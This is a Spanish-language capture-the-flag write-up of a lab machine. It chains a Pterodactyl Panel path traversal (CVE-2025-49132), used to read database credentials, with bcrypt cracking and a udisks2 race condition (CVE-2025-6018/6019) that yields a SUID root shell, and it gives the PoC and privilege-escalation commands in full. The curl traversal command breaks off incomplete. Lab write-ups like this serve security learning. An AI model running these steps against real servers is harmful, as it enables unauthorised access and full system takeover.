Pterodactyl Machine

Máquina Linux de dificultad Media que involucra la explotación de dos CVEs recientes en el software Pterodactyl Panel. Path Traversal para leer configuraciones con credenciales MySQL, cracking de hashes bcrypt, y escalada a root mediante race condition en udisks2 con imagen XFS y SUID bash.

Escenario

Pterodactyl es una máquina Linux de dificultad Media que involucra la explotación de dos CVEs recientes en el software Pterodactyl Panel. El acceso inicial se obtiene mediante CVE-2025-49132, una vulnerabilidad de Path Traversal en el endpoint locale.json que permite leer archivos de configuración del sistema incluyendo las credenciales de la base de datos MySQL.

Tras crackear hashes bcrypt con John, se obtiene acceso SSH. La escalada a root se logra explotando CVE-2025-6018/CVE-2025-6019, una race condition en udisks2 que permite montar una imagen XFS con un binario SUID para obtener una shell root.

CVE-2025-49132 — Path Traversal

CVE-2025-49132 — Pterodactyl Panel Path Traversal / LFI
El endpoint /locales/locale.json del Panel Pterodactyl es vulnerable a Path Traversal. Los parámetros locale y namespace permiten navegar fuera del directorio de traducciones y leer archivos arbitrarios del sistema, incluyendo configuraciones con credenciales.

Usamos el PoC público para explotar esta vulnerabilidad:

$ git clone https://github.com/str1keboo/CVE-2025-49132

# Verificar la vulnerabilidad:
$ python3 CVE-2025-49132-PoC.py prueba http://panel.pterodactyl.htb

# Dump completo de configuración con credenciales:
$ python3 CVE-2025-49132-PoC.py dump http://panel.pterodactyl.htb

También podemos leer el archivo de configuración de base de datos manualmente:

$ curl -G "http://panel.pterodactyl.htb/locales/locale.json" \
  --data-urlencode "locale=../../../pterodactyl" \

Escalada de Privilegios — CVE-2025-6018/6019

CVE-2025-6018 / CVE-2025-6019 — udisks2 SUID Race Condition
Vulnerabilidades en udisks2 que permiten a un usuario sin privilegios escalar a root mediante una race condition durante el montaje de imágenes de disco loop. Un atacante puede montar una imagen XFS que contenga un binario SUID y ejecutarlo antes de que el sistema lo desmonte.

Método Manual: Usamos gdbus y udisksctl para explotar la race condition:

# 1. Verificar acceso a login1 (requiere sesión activa):
$ gdbus call --system --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanReboot

# 2. Configurar imagen de disco loop:
$ udisksctl loop-setup -f /tmp/xfs.image --no-user-interaction

# 3. Buscar el dispositivo loop asignado:
$ ls -la /dev/loop*

# 4. Activar resize via gdbus (trigger de la race condition):
$ gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loopX \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'

# 5. Buscar bash SUID en /tmp:
$ find /tmp -name "bash" -perm -4000 2>/dev/null

# 6. Ejecutar con privilegios preservados:
$ /tmp/blockdev.XXXXX/bash -p

# whoami
root
